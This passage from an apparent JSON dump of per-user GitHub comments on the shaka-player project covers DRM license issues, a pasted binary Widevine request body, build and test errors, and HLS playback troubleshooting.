MPD or from the media, and not be able to use both (with same filtering algorithm to ignore duplicated PSSH boxes).. If I understand correctly, your reference use case is that the MPD PSSH is intentionally used to replace PSSH in the stream, and therefore the two should not be combined.\nMy reference use case was that with live key rotation, the MPD periodically gets updated with PSSH for current key(s). This PSSH is identical to the one in the stream, but allows license acquistion before media segments are accessed. This use case does need future PSSH key rotation signaling from the media (in addition to the first from the MPD).\nWould it be reasonable and possible to distinguish between the two cases based on the MPD type (Static or Dynamic) assuming the first use case is mainly used for VOD, and the second for live?\nAlternatively, configuration can be enhanced to allow for PSSHs based on 3 options: MPD only, Media only, both MPD and Media. . ",
    "jsvictor": "From the above discussion:\n\"PSSH events in the stream are only meant for hierarchical key scenarios.\nThey must be related to already pre-fetched root licenses\"\nCould someone please elaborate the relation of keys to pre-fetched root licenses. Does this mean that the root license is used to decrypt the content encryption keys received for content decryption?\nAlso, can Widevine client player log/ record the keys which have been used for content decryption. I would like to view the logs to be able to identify till where the content was viewed. . Thank you for your detailed response. Can Content Decryption Module (CDM) keep a track of which leaf keys have been used to decrypt content (or even a track of which leaf keys have been decrypted using the root key). \nThis kind of information could be useful in scenarios such as monetization, or simply the provider to know to what extent the content has been viewed by the consumer, etc.. ",
    "ExllntSuppt": "Thanks.. ",
    "jeremypress": "@vaage, my bad. Updated the description following the template. . @vaage updated. Thanks @vaage!. ",
    "kocoten1992": "Wow, thank for all the effort guys\n@vaage you go as far as trying all that, :heart_eyes: \nI'll use your work around until 2.4, hope it will help other too. Does this relate to https://github.com/google/shaka-player/issues/924. @TheModMaker thank you :+1: . I try it on https://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=//storage.googleapis.com/shaka-demo-assets/sintel/dash.mpd;lang=en-US;noadaptation , same thing happen. @TheModMaker thank for the word 'red herring' (new word), I've create snippet serve at backup and easier debug for this problem\nhttp://jsbin.com/veginugace/edit?html,console,output\n(On this snippet, change between 110p and 546p to see the bug). yep, that exactly what happen, when I tried to call\nshakaPlayer.configure(...)\nIt will trigger shaka.media.StreamingEngine.prototype.switchInternal_ , and then when I call selectVariantTrack it call switchInternal_ again, fishy thing can happen!\nI think I'll fix the demo, I want the badge contributor :smile:, the fix gonna be like:\n```js\n// from\nshakaPlayer.configure({abr: {enabled: false}})\n// to\nif (shakaPlayer.getConfiguration().abr.enabled) {\n  shakaPlayer.configure({abr: {enabled: false}})\n}\n```. P/s: but should we guard again this, I think this is a trap, at first use, I didn't know call configure would mess with selectVariantTrack at all\nP/s: On the other hand, if dev try the demo and find out result diff from their, they will dig up the demo, so maybe not needed to guard.........?. hope this help, https://github.com/mozilla/vtt.js. ",
    "thatsnotright": "Fantastic, the bufferBehind update works around the issue for now.  We can't change the i-frame interval, unfortunately, so this is the GOP boundary.. ",
    "colde": "@joeyparrish Yes. That is correct. The issue is with CAF (which bundles the shaka-player receiver at least)\nAnd yes, i figured there would be a chance that you wouldn't know, and that i should go talk to the Cast team, i just figured that you guys helped them package it, and had a update process in place as well.\nYeah, i've read that 3016 seems to be a decoding error. But since it works with the shaka-player receiver, and not with CAF. It seems unlikely to actually be a decoding error, it seems more likely that the receiver in CAF is not setting things up correctly.\nI'll file an issue with the Cast team. They unfortunately don't seem as responsive as you guys.. Thanks for doing the analysis @TheModMaker. We will take it up with our origin packaging vendor, as it should of course be correct, even if you have a workaround.. ",
    "samwidmer": "CORS are setup for https://shaka-player-demo.appspot.com/\nHere is the request body from my Ubuntu laptop\n\b\u0001\u0012\u00dd\u000b\n\u0084\u000b\b\u0001\u0012\u00eb\n\u00ae\b\u0012\u0010a|c'V\u00da\u000ek\u00daP\"\u001d\u00863\u00c7\"\u0018\u00b8\u00f6\u00e1\u00c5\u0005\"\u008e0\u0082\u0001\n\u0082\u0001\u0001\u00a6zF\u0088\u00ac\u00b1r\u0089\u00f9TNz\u00fe3\u00ff6F\u00b0\u001d\u0089\u00f3\u0083!\u00e0Azc\u00d8\u000f.\u00a8\u00a3tG|\u00f5K\u00ed\u0099!OR\u00ecZ\u00d2l]\u0097\u00f5\u00a8\u0091\u00bbr'\u00ff\u00f4\u00ebh\u00b6\u00bb\u00147\u0082R\u009b\u00b1\u00c4\u009f-\u009f\u0085\u00bel\na\u00dc;\u009f3=U\u0088\u00e3\u00bf\u008c\u0096\u00ee\u00e3f\u00ef,\u008f\u00c9| \u009f\u0014$\u00cf\u00b7\u0088\u00eaw\u000b\u0016\u00f66\u00be\u00d7\u00a3~U4\u00bf;{\u00c8}\u00e3\u0014\u001c\u00be.b\u0093   \u0005\u00f4\u009b\u00f3\u00f8Y\u0015\u00f4y\u0088\u0098\u0014\u008a\u008d\u00e1\u00cb\u001f\u00ed\u0006W\u0093M\u0015\u00d4$yIgni\u00cbo\u00d7}\u00d1\u0096\u00bd\u0080\u009d\u0004\u00df\u009f.\u00c1\u00dd\u00e1\u0010\u00bc\u00f1\u00b1\u009c%\u00ben\u00c7p\u009d\u00c8>\u00c7@\u00ef\u00e4k\u00d8$\u00ed\u00ec^\u00b1vr+]m\u009f\u0091,\u008d\u0012\u00eb\u00dcW\u0097\u00d9x\u0014<\u00adR\u00e1\u00e4M\u00e9\u00b6\u00ce-M\u0005r\u00e8\u00908R\u000e\u001b\u00e0\u001f9n\u00a8\u001cDs\u00f2\u00a1\u00f9%V\u00ce\u00a2\u00b8y\u0001\u0001( 9\u0012\u0080\u00ba\u00b2\u00bbe|\u0084\fX8\u00f7\u000bQ\\\u00fb8\u00e9>\u00ae\u009c\u00da\u00c7\u00c6P\u0084J\u008c\u0097\u0095\u00c9R\u00e4\u0089\u00d5n\u00da\u008c\u00a6\u00e2\u0089\u008b\u00c3\b\u0004V\u0088\u008e   5\u00ce\u00c5\u00e7\u00e4lu\u00a6S\u00bfe&\u001eoF;MM]\u008c\u0012\u00c4T\u00fd(\u0094L\u00b1\u00f7UF\u0099Bx\u00be\u00d1\u00e0\nm\u00c1w\u00a6Q\u00d7\u001b\nAx\u00ee&\u00eby\u0095\u00ee\u00f3\u00ef+{N\u00b9jT    Z\u00f6\u00b4!\u00a1,\u00b6I\u0086\u00bd\u00ccy\u001f>M\u00e4\u00f5\u00f4Nn L\u00a9\u0088\u0018\u0086b\u00d1!\u00b7\u00c2fj\u00a2\u00a7\u000e|\u008f\u00eckI\f\u000b\u0005\u00c1\u00b1\u00ea=q\u00f6<\u00ac\\v\u00df\u0088\u00b5\u00a5\u00b9,f\u0083ja\u00dd0I\u008f\u00f54\u00ae\u00e2\u00ec\u001f>\u00cfg\u00b1\u001b\u00a1\u0086\u00db\u0011\u00fc\u00d3\u00a1Z5K\u00bb\u00f3\u00cc\u0081]P\u00b9\u00f3\u000b\u00fd4\u0001\u0013\b\u00cdr\u00f0\u00a87\u00bb\u0001)\u009e\u008c\"\u00ad\u00ba\u009f\u0007\u0098\u00e0)iQF\u00e0H\u00df\u00af\u009e\u00d9#\u00be\u00b3g\u00d7\u00b4+\u00aby&\u001a\u00b4\u0005\n\u00ae\b\u0001\u0012\u0010\u00d9\u00e5 \u009e)j\u0086\u0011\u00b2\u0007\u009aiTo\u00c87\u0018\u00d8\u00f4\u00dc\u00c5\u0005\"\u008e0\u0082\u0001\n\u0082\u0001\u0001\u00d6Zs+\u00fe\u00ec\u00af\u0083\u00f3!\u0013R\u009b\u00ea97\u00ce)l\u0013\u00b4\u00bcq\u00e3M\u0014\u00cd\u00bdl\u0093+\u00152\u008b\u0095\u00dd:J\u00f3\u0017\u0093\"\u00ef\u00acU3\bb\u0015sQ\u008b\u00e2\u008b\u00a9\u009b:\u008d\u00a1\u0011 \\p,rJ\u00ac@\u00aa\u008c\u00d4\u00cb=\u00dd\u0086\u00fae\u00b0t\u0097ww)\u00dd\u00dd\u00ff\u009dR\u00c7<\u00d7k\u000f\u00c8\u0092'\u00d2H\u001f/\u0083\u00b9fT\u0084\u0006\u0081\u00ff\u00eb\u00d6\u00df\u0085s\u001d\u00c5 4\u00a8\u00a1\u00bf\u00e6B\u0091t>N\u009f\u001e\u0097K\\\u008f\u00b2\u008a\u00d1\u00dd\u00cd#\u00dbr}X \u00e9Ar\u00eaA\u00aaN\u00bd<\u00d6x\u00dc\u00c8\u0014\u00ea\u0085\u00be\u00bf?\u00d3\u0016\u008d&F\u00b1\u00f3GIT\u00fe\u00bb2\u00f3L\b\u00ac\u00fe5y?\u00e7\u0095Kp \u00e4\u00b8bv\u009b5I\u00a5\u00b4.\u00e2\u00a3\u00c3\u00b7\u00e9f\u00be8\bfgK\u00870\u00f9\u00e1\u009a\u009aj\f \u0098t\u001dC\u00c5\u0007\u00fa\u00ba\u008e\u00f3\u00f7\u00e4\u0018\u00b3\u0094\u00c9\u00c2,\u00db|\u009a\u00db{\u00b4 \u00ebTy\u001d\u0001\u0001( 9\u0012\u0080EP@\u00ae\u009bG\u00ad\u0012zn\u0012\u00d9\u0013\u0083\u00bd\u00aa\u008aS\b\u00f7\u00b2\u00d0\u00aa\u0010\\\u00ee\u00d8q\u00aat\u008f||5\u00a6\u00d2\u00eb\u00fe\u0014ww\u00b7\u007f\u00cdX\u00ab\u009bb\b0\u00d9mK\u008e\u0093\u00e4\u0091\u00cdp\u00e6\u00df\f\u00b4\u001e\u00fa\u007fx\u00a4:\u00db\u00d9\u0005\u00e4\u00d3\b[\u0011\u001f\u00af)h\u00ed\u00b1>\u00cfoN\u0093\u00e6 /1O\u00bc\u00fe[\u008d\u00afP\u0080\u0010 \u008d\u00f33\u00eaxo\u0086 \u00f8@\u0001\u0015\n\u0080\u00c8N\u00cc\u00f4\u009cve1\u00f4\u0017\u00d6\u0093\u0004\u00af\u00f3,!\u001er\u0088\u007f\u0005'\u00ac\u00b4\u008f\u0090\u001a\u00c6\u00aan\u009fz_\n\u00ac\nD\u00e3\u001f)\u00cc\u00d2I\u00ed\u00a1\u0085V\\\u00d2E\u00a8\u00bab\u008e'\u001bn\u00bcT? \u00d9\u00ef\u0016&\u00f8\u0007\u00fdD\u00c7tHj\u00ceutW%\u00c4\u0081\u00daM\"\u0098o\u0093\u0018w\u00e2 Z95\u00dec:\u00d4\u00f53\u00f4'\u00980\u0019\u00cd\u008eM\u00d0b\u00d3}\u009cW\u0005\u00fe\u00c4\u00d8):\u00b5-\u0013\u0094\u0096\u00a55h\u00b0_\u009b\u00c5\u000b\u00ba\u00d8\u00dc\u001d\u0001\u0099w\u0083\u00aap\nXp\u00db\u00c3!\u00fd\u0019\u00a3 $A\u0092Z\u00de|i\u001e\u0019\u009f\u0087\u0012\u00d1\u00f0\u0094\u00c8\u00ec\u00f5\u001c\u00cc\u0098\u00e9\u00ce\u00c1\u00bc\u00b9|\u0019D k\u0010k\u0091Y\u009f\u00d0\u00fa%\u0088[\u0019\u00c3\u0092\u00e0y\u007f\u0013\u00c6\u00f1WP\u0098I*C_\u00c8\u00e67N\u009e#\u00bd\u00e1\u00e4\u00d7\u00d6k\u00f1%\u00e5\u009df8\u00e7\u00fe\u00bc\u00f3\u00f3\u0088\u00b2Y=\u001ed\u00bf@\u00c6\"\u009b\u00b1\u0087|\u0085[\u00b1\u00060\u0082\u00db\u00b3\u00edZ\u001a\u001b\n\u0011architecture_name\u0012\u0006x86-64\u001a\u0016\n\fcompany_name\u0012\u0006Google\u001a\u0017\nmodel_name\u0012 ChromeCDM\u001a\u0016\nplatform_name\u0012\u0005Linux\u001a\"\n\u0014widevine_cdm_version\u0012\n1.4.8.10082\b\b\u0010\u0018\u0001 \u0012J\nH\n2\b\u0001\u0012\u0010\u00a2 \u001c\\\u00ddoN\u0096\u00a8\u0098\u00ec\u00bd\u000f\u00f4\u00ed\u00bf\u001a\u0010apogeeverimatrix\"USA*\u0005AUDIO\u0010\u0001\u001a\u0010\u00de\u00b2\u009c\u00aag\u00a2\u001d\u00d7;\u00de\u00b2L\b\u00be\u0018\u00d9\u0018\u0001 \u008c\u00a3\u00b8\u00d0\u00050\u0015\u001a\u00801\u00fa\u00cf\u00c8\u00b2\u0089\u00ec\u00ac\u00f1\u00d6`\u0004\u0013d&\u009e\u00b0ia\u0001\u00fbN\u009f1+yb\u00fd ,\u0005s\u00a5\u00eb\u009dc  \u00d7\u00f8W\fWcu9\u00805p\u0080_\u00e6\u009c9\u00e9\u008d\u0017\u00fd\u0015\u00afDI\u00b35\u00c0\u00eb:\u00b3\u008b&\u00f8\u00d8r\u00c0W\u00a8\u00d5\u0083\u00c7\u009b\u0088\u00aa\u00f7S\u0011\u00af\u000f\u0011\u000f\u0011G\u007fC[e>\u001eO\u00a5\u001e>\u00ef\u00d05\u00baN\u00ec#$\u00feX\u00cb\u00f5\u0091\u00e9B\u0015\u00a9\u00ec\u00e5\u00d1\u008b\u00caR\u00bb\u00c6\u0010\nB\u00be\u00e5\u0007[~~\u0012\u0007\u00e8\u00a7w\u00c8\u00ce[&7\u00be\u00a2\u00b4\u00d2)\u00a4\u00f9V\u00be\u00a4\u00b207\u00a5\u0081\u00bd\u0093|\u00c0\u00fd   \u00ef\u00cfV\u00ea\u0097\u00b2l\u00a7\u0017n\u00a5\u00b93F\u00f2\u0081!sh\u00eba:+{)\u0081.m\u00a8\u00ae\u00c4\u000baM\u0007\u00a8B/} \u00e8\u001dq(\u008dXP\u0011\u00ee\u00b6e\u0093o\u0085w\u0014\u00e6\u00fe;\u00fe\u0097\\\u00cd[\u0082\u00b4\u00d8\u000e&\u0010\u0006\u00189J\u0097\u001a\u00ffU\u00b4\u00cb\u00f5+\u00995r\u000b\u00cc. Here is the request payload from my windows box.\n\b\u0004\n. Why would it be handled differently on Linux and Windows boxes though. Also is there a way we can actually verify this is what's happening?. I ran it against the proxy at proxy.uat.widevine.com/proxy and it looks like you are right. There is an empty req like I'm getting a 500 on and then another full req. It failed ofcourse because I didn't pass any client id info like I do for our proxy but I think we've found the problem.. It would probably also be helpful if there was some explanation I could pass on to the proxy vendor about why it happens with one OS but not the other. Do you have any ideas about that?. ",
    "mhosman": "Same error here!!! 500 Internal Server Error from license server. Tested with Windows 10 and Chrome 62. If I change Chrome version to 60 (same Windows machine), it works. I tested the same version of Chrome (62) in OSX and it works, so... the problem is with Chrome 62 and Windows. (Problem is also in other libraries as DASH JS).. Maybe a time issue? How can I to solve this? Tank you very much.. Hey @joeyparrish, sorry I closed this by mistake. Is not resolved. For example, I have this unencrypted content. It's playing ok With DashIf last player reference. Not in Shaka.\n(At least to start with an unenctypted content, maybe because of this problem, the enctypted is also not working. I just checked some issues and in this case the UTCTiming is in the mpd file, so... I can't find the problem).. Hey @joeyparrish, there's any update for this issue? I'm still not able to reproduce this content in Shaka. Thank you very much!. Solved. Just an error with the manifest.. ",
    "igncp": "I signed it \ud83d\udc4d . ",
    "legrengo": "@TheModMaker !\nhello TheModMaker,\n I am a beginner in the circles\nhave you managed to make it work ??\nI do not know what started. when I do\n./build/test.py --browsers Chrome,Firefox,Edge\nI have the following errors\n[INFO] Running test (1 / 1)...\n14 02 2019 17:30:39.213:ERROR [launcher]: No binary for Edge browser on your platform.\n  Please, set \"EDGE_BIN\" env variable.\n14 02 2019 17:30:50.670:ERROR [launcher]: Cannot start Firefox\n        Error: no DISPLAY environment variable specified\n14 02 2019 17:30:50.728:ERROR [launcher]: Cannot start Firefox\n        Error: no DISPLAY environment variable specified\n14 02 2019 17:30:50.780:ERROR [launcher]: Cannot start Firefox\n        Error: no DISPLAY environment variable specified\n14 02 2019 17:30:50.782:ERROR [launcher]: Firefox failed 2 times (cannot start). Giving up.\n14 02 2019 17:30:56.358:ERROR [launcher]: Cannot start Chrome\n(google-chrome:2283): Gtk-WARNING **: cannot open display:\n14 02 2019 17:30:56.482:ERROR [launcher]: Cannot start Chrome\n(google-chrome:2324): Gtk-WARNING **: cannot open display:\n14 02 2019 17:30:56.631:ERROR [launcher]: Cannot start Chrome\n(google-chrome:2346): Gtk-WARNING **: cannot open display:\n14 02 2019 17:30:56.633:ERROR [launcher]: Chrome failed 2 times (cannot start). Giving up.\n[INFO] Run complete\n[INFO] Result (exit code): 1\nI respected the installation documentation\nConsole:\nUsing native MSE as-is.\nvttcue.js:36 Using native VTTCue.\ndrm_engine.js:1507 It is recommended that a robustness level be specified. Not specifying the robustness level could result in unexpected behavior.\nservice_worker.js:1 Uncaught (in promise) TypeError: Request failed\nservice_worker.js:1 Uncaught (in promise) TypeError: Request failed\n\ufeff\n\u200b\nI've been trying for days to find information\n. thank you so much :+1: \nI can tell you\nno reaction from ChromeCast ^^\nI give my tongue to the cat. there is no button to launch Chromecast. thank you for your answer ,\n.I am not very good at solving the problem unfortunately. what do you mean by \"refactoring\" please ?. thanks for your relevant explanation\nthe Chromecast button appears in the hamburger menu (with the function picture in picture).\nthis solved the problem for me\nthank you so much. ",
    "danmo": "Solved. In my case, it was due to missing VMP signing.. @joeyparrish I'm using Chrome on Win 7 32bit and using task manager to monitor memory consumption. Dev tools are closed.. Hi @joeyparrish , this one is a pretty big blocker for us, any advice on how it can be resolved?\nReproducing it is easy, for example, you can start downloading a 4k video in the demo app, you'll see the tab memory usage increasing. \nBellow are some screen grabs of a heap snapshot I did:\n\n\n\n\n\n\n. @joeyparrish many thanks, the provided solution has fixed the memory issue!. Getting same error with an Azure Media Services license server on a production application. It fails exactly like the demo but AMS doesn't provide any error message besides the 400 bad request response. Non-persistent license requests are successful. . ",
    "nicktruch": "I get an error too but not quite the same :\nTraceback (most recent call last):\n  File \"build/all.py\", line 20, in <module>\n    import build\n  File \"/Users/truchaud/Sites/shaka-player/build/build.py\", line 472\n    print 'Usage:', sys.argv[0], \"\"\"[options] [commands]\n                 ^\nSyntaxError: Missing parentheses in call to 'print'\nMacOS 10.13.1\nPython 3.6.2\nJava 1.8.0_151\nNode v9.2.0\nNpm 5.5.1. ",
    "shaygolan01": "Thank you for understanding the license issue.\nI tested the reverted fix #1061 and our live stream still doesn't play.\nOn v2.2.2 the live stream plays fine. \nIt seem  that another change for #982, this fix if (this.video_.paused) return; has the same effect as if (this.video_.seeking) return;\nOnly removing both lines enables the stream to start playing.\nI understand that these fixes are for issues occurring during playback, maybe a condition allowing to ignore these lines only on playback start is a suitable fix for our issue?. Tested with 2.2.7 Our live streams are playing.. ",
    "crazytoad": "I can confirm the issue is fixed in v2.2.0-133-g59b48f0 - thank you!. ",
    "buggles333": "Have just tried with a different source file and encoded it to HLS again using shaka-packager.  Still get the same results.\nDoes anyone have a zipped HLS file they can link to so I can download and compare layout and manifests?. Will give it a try now and let you know. Struggling to build a windows binary for the latest commit, I think a later version of Visual Studio is causing conflicts.  Anyone have a prebuilt binary?. Thank you!  I was just creating a clean windows install but this saves me a job.  Will try out a new encode now and update. Did a fresh encode using the new version of the packager and all is working now, thanks for the help. One further question though, does Shaka Player work on iOs or am I better of using their native HLS player?. ",
    "Giuscar": "Thank you for your answer.\nThis is what I am trying to do.\nAfter I finish to define the externs how can Closure match my externs with my external library? Is it a process done automatically by the compiler?\nThank you. \n. Thank you. \nI have been able to compile the library. But what about the demo app?\nShouldn't it be compiled as well?. Ok, thank you. . ",
    "wasp898": "I signed it!. Thanks a lot for your reply.\nThese few days I've spent some time testing it on every browser for desktop. Issues occur when you clear too close to the playhead. As long as the margin is computed appropriately, I don't see any artifect or stuttering. Playback goes smoothly.\nHere's what I tried to do in detail. After computing (approximately) the next segment boundary, I tried clearing from that point on when switching variant. This caused big problems already (because of a lack of accuracy probably), so I tried adding 0.2 seconds to such margin, and it was enough to solve the issue on most browsers except mainly for Chrome. Finally, I tried to increase the margin by adding the duration of a segment, and I stopped getting stuttering altogether. As long as the network state is good though. I mean, the only stutters that I noticed have happened because of buffer depletion, but that's a different issue.\nBottom line is: I think two segments worth of buffer is a safe minimum to consider when computing the margin; and then the final value should be computed according to the bandwidth estimate I guess, to avoid depletion.\nI have found the commit where the support was dropped: https://github.com/google/shaka-player/commit/385a501d0dd2aa31f55d5425441baca86ac4d982\np.s. I've tested with Chrome, Firefox (52 and 57), Safari, Opera, Edge, IE 11. I also tried different segment sizes: 1, 4 and 6 seconds. Tested under good network conditions, mainly. Some tests under bandwidth cap as well.\n. Thank you!. Yes, absolutely, still interested! I'll get to work asap, thanks.. Okay, I rebased and fixed the style related issues as requested. No conflicts, and build went fine.. What did you have in mind here? Not sure how to move this without duplicating things after.\np.then(function() {\n    if (!this.destroyed_ && flush && safeMargin == 0) {\n      return this.playerInterface_.mediaSourceEngine.flush(mediaState.type);\n    }\n  }.bind(this)).then(function() {\n    if (this.destroyed_) return;\n    shaka.log.debug(logPrefix, 'cleared buffer');\n    mediaState.lastStream = null;\n    mediaState.lastSegmentReference = null;\n    mediaState.clearingBuffer = false;\n    mediaState.endOfStream = false;\n    this.scheduleUpdate_(mediaState, 0);\n  }.bind(this));. Oh okay, got it, thanks!. In SimpleAbrManager I see that the call to the switch function only passes the variant, without the optional parameters. I kept it this way. Is that okay?\nI pushed the other modifications, including the updated abr manager extern.. ",
    "remoroethlisberger": "Thanks for your answers, to be more specific, I am currently using the following MPD file:\n```\n<?xml version=\"1.0\"?>\n MPD file Generated with GPAC version 0.5.1-DEV-rev5619  on 2017-11-30T20:56:02Z\n\n\nDASH.mpd generated by GPAC\n\n\n\n\n\n\n\n\n\n\n\n\n\n```\nthis works fine for me and the MPD file does get fetched every 10 seconds. However when I remove one representation (e.g. comment out the second representation) during the playback, I will most likely get an error. (tested it out on MP4Client). Any ideas on how to dynamically change the number of representations available and let the client know? :). Ok, thanks for the update. Appreciate your input! :). ",
    "squarebracket": "Huh. Ctrl+f5 didn't do it, having the console open didn't do it. Guess I specifically needed the network tab focused for \"disable cache\" to take effect. It's showing now, thanks!. ",
    "vickyvxr": "Sorry the issue number is #1164 . Thank you for your comments! I close this pull request and I will check your bug correction !. Good morning, \nYou can use these two MPDs generated using your sample media in your shaka player demo APP.\nThese MPDs have 3 periods of 20 seconds with presentationTimeOffsets in audio/video/subtitle tracks.\nIf you try these files in the demo with the latest version you can see that the subtitles are reset in each period, using the PR version the subtitles are maintained and synchronized with the audio track in all the periods.\n\n1 period: https://www.dropbox.com/s/zeq1fmo5vout6an/1period.mpd?dl=0\nSubtitles are maintained during timeline\n3 periods ABC: https://www.dropbox.com/s/ke8x1scauthawau/3periodsABC.mpd?dl=0\n3 periods BCA: https://www.dropbox.com/s/cpxc5x0xhlywyo6/3periodsBAC.mpd?dl=0\n\nThank you very much for your support :)\n. I'm sorry about all the typos in the manifests, thank you very much for the corrected versions.\nAnd I will check the bug correction to learn the best way to solve it!\nThanks for all!\n. ",
    "caldrix": "Hi joey,\u00a0\n\u00a0\nas explained i work for a confidential company. i'm working for enable you a remote access bur it may take time.\n\u00a0\ncan you please review the logs and m4s sended. may be if i send you TS files, you can \"simulate\" the stream ?\n\u00a0\nlet me know.\n\u00a0\nregards. hello,\n\u00a0\ni can open you an access via vpn.\n\u00a0\nthanks to confirm you ip adress.\n\u00a0\nregards. ",
    "simhavenkat": "Media Internals shows: DecryptingAudioDecoder: failed to init decoder on decryptor\nWill check on the keyid mismatch but Android exoplayer also wouldn't be able to play in that case. Right? Looking into StreamVideoSource onKeyStatusesChange - all my streams are marked with allowedByKeySystem\n. Will do the V2 test - quick followup question: Can shaka player play a partially encrypted stream? Or was that something added recently?. Verified that my content is fine as it plays fine with my local shaka demo app built off 1.6.x. The difference i see between my local copy of shaka and the 1.6.x is - the stream starts saying there is no more segment references and signals end of stream. Is there any action required from the player once the license is fetched? . Never mind. . Mostly eyeballed with eme logger open. The encrypted event and license events happen right in the beginning while the video is preparing to play. I suppose the startup time with or without DRM is comparable to the time it takes to fetch the license? \nI just played one of the widevine videos in the shaka-player-demo. \n. Cool - ya - i delayed the license response and see the playback starts. Thanks. . Turned out my sample webview app was missing PROTECTED_MEDIA permissions. Setting that fire tv is able to play shaka demo app DRM content.. https://stackoverflow.com/questions/49187659/android-webview-drm-content-playback. ",
    "dcharbonnier": "no, just that bluebird is complaining is you don't disable warnings and that this https://github.com/google/shaka-player/blob/f0c85093b4238b1907c1eac41eff03d7b8dd6da4/lib/dash/dash_parser.js#L1465 could be way more easy to debug for example.. ",
    "nicolasd": "Hello,\nlooks like it was a webm problem, \nthe command line used to encode the webm using ffmpeg was : \nffmpeg -i input_video.y4m -c:v libvpx-vp9 -s 160x90 -b:v 250k -keyint_min 150 -g 150 ${VP9_DASH_PARAMS} -an -f webm -dash 1 video_160x90_250k.webm\nBut, with this, it seems that some times the encoded webm does not have cued.\nSo i had to use the \"mkvmuxer_sample\" from libwebm and now it's working...\nThe document says that the libwebm muxer sample is not mandatory with latests ffmpeg, but it's wrong.\nthanks for your help. ",
    "srampur": "Still fails when ran the test with the latest chrome\nChrome 63.0.3239 (Linux 0.0.0) StreamingEngine gap jumping jumps small gaps in the middle FAILED\n        Failed: Timeout waiting for time\n            at <anonymous>\nChrome 63.0.3239 (Linux 0.0.0) StreamingEngine gap jumping jumps large gaps in the middle FAILED\n        Failed: Timeout waiting for time\n            at <anonymous>. @joeyparrish , thank you for the details. \nAttached the screenshot of output of test ./build/test.py --filter StreamingEngine.gap.middle.\n\nCPU % is below 50 and not much change in load average.\nPlease to note that the OS is Ubuntu with virtualbox. Does this affect?. test_errors_shakaplayer_bug1179.txt\nThank you for the details. Please find the attached log.. @joeyparrish, do you need any other details from me? apart from the logs? like Ubuntu VM's details?. ",
    "epiclabsDASH": "Let's wait for bigger changes... It is embarrassing adding myself as a contributor given the huge change I have proposed :).. Hey, @TheModMaker, you have been so hard with dash.js... :). Just kidding. \nSome notes from my side that hope are useful. Regarding @TheModMaker comments:\n\n\nIn dash.js there is something similar to what shaka-player calls network filters although shaka-player approach is more complete.  For example, dash.js has a mechanism similar to shaka-player RequestFilters but it doesn't have ResponseFilters. We are working on it.\n\n\nWe are not calling it plugins, and they are not plugins in the strict meaning of the word, but dash.js has a mechanism that allows to extend any of its controller classes so you can implement your own behaviors. Additionally, dash.js also allows to define your own ABR algorithm as shaka-player does.\n\n\ndash.js new version (to be released tomorrow) also includes a new feature for jumping gaps. We are also working on some changes to increase the stability when playing technically bad content although, honestly, not at the same level than shaka-player. Our main priority is building a reference player of MPEG-DASH and follow MPEG-DASH standard and IOP guidelines, although having in mind we create something useful for the industry.\n\n\nRegarding browser and platforms we, at dash.js, also give a lot of importance to the idea of having a consistent streaming experience across different devices/platforms and run automated and manual test in difference devices/platforms. \n\n\nShaka-player supports a cache layer based on ServiceWorkers. Dash.js doesn't have that kind of mechanism.\n\n\nRegarding @joeyparrish comments, don't have too much information to add. He covered pretty much everything. Just a few points:\n\nPre-Load feature. Possibility of start loading the manifest and chunks before having a <video> element.\nSupport for Inband and inline events and the management of special events that force Manifest updates. This enables, for example, ads insertion solutions for MPEG-DASH based streams.\nABR algorithm complexity. Probably I am wrong but as far as I know ABR algorithm of shaka-player is only throughput driven. it takes throughput measures and, using a EWMA based algorithm, takes the decision about the best bitrate to play. ABR algorithm of dash.js is a bit more complex. We are taking into account different parameters: EWMA of throughput measures, drop frames, recent history of bitrate switches, and buffer level. In fact, by default, in dash.js once we have enough buffer, ABR decisions are buffer level driven and throughput lose importance. That gives us good results when trying to keep high qualities as much as possible while avoiding rebuffering events.\n\nProbably I missed something for either Shaka-player or Dash.js but this is pretty much what I have in the top of my head.\nBy the way, it is great that users have these two high quality open source players to choose.\n. ",
    "kchandran1029": "Thanks @joeyparrish . Make sense to de-prioritize since the standards are changing , but good to have to be backward compatible.. @joeyparrish Do we have a time frame for the HLS desktop Safari playback ? MPEG-TS type to be specific. . @joeyparrish So cool , can't wait to test it out. Thank you so much for you quick response :) . @joeyparrish Please correct me if I am wrong , we are still working on the fairplay support correct ? Hopefully in 2.4 ? . hey guys , I am running into the same issue and I included muxjs ( locally built ) and I ensured window.muxjs is defined . is there anything else I need to do with muxjs ? \nUnfortunately I am also getting 6001 , but I am using an encrypted content ( http://b028.wpc.azureedge.net/80B028/Samples/a38e6323-95e9-4f1f-9b38-75eba91704e4/5f2ce531-d508-49fb-8152-647eba422aec.ism/Manifest(format=m3u8-aapl)) \nAny advice is highly appreciated. . Ok , quick update , I removed the DRM config, since it's un-encrypted  and no more 6001 error. So Muxjs played it's role, but again , it's not playing back the content , stuck at the first frame and buffering. \nAny thoughts ?. @sergioavazquez : hey please let me know if you are able to get it play back , for me it's playing intermittently , but on demo app it works fine after an initial hickup , I get the below log on demo app --\nUnable to fetch a partial HLS segment! Falling back to a full segment request, which is expensive!  Your server should support Range requests and CORS preflights.\n-- \nThen it just play back fine. In our custom app , it doesn't play . I am wondering if I need anything more than just muxjs . Do I need to override any default config , please help. Thanks . @sergioavazquez : hey please let me know if you are able to get it play back , for me it's playing intermittently , but on demo app it works fine after an initial hickup , I get the below log on demo app --\nUnable to fetch a partial HLS segment! Falling back to a full segment request, which is expensive!  Your server should support Range requests and CORS preflights.\n-- \nThen it just play back fine. In our custom app , it doesn't play . I am wondering if I need anything more than just muxjs . Do I need to override any default config , please help. Thanks . @sergioavazquez  : Thanks for the response , but is it playing fine for you ? Can you please test with the manifest I posted above ? I can't get it to play back.. @sergioavazquez  : Thanks for the response , but is it playing fine for you ? Can you please test with the manifest I posted above ? I can't get it to play back.. It's weird , the demo app is able to playback the same after some initial hick ups , wondering what are we missing from demo app.\n@sergioavazquez Would you be able to share the content or some test contents you have , may be with some decent timeshiftbuffer ? Thanks . It's weird , the demo app is able to playback the same after some initial hick ups , wondering what are we missing from demo app.\n@sergioavazquez Would you be able to share the content or some test contents you have , may be with some decent timeshiftbuffer ? Thanks . Hey Guys , \nPlease let me know if I have to open this as new separate issue, I will be happy to do that , but I feel Shaka is having a hard time to play most of the HLS stream on Safari browser. Interestingly it works in Chrome. I have tested with couple of other players out there and they can play back the stream well.\nAlso, I assume this has a master play list \nhttps://akamai-axtest.akamaized.net/routes/lapd-v1-acceptance/www_c4/Manifest.m3u8\nIs there anything I am missing out or do we have 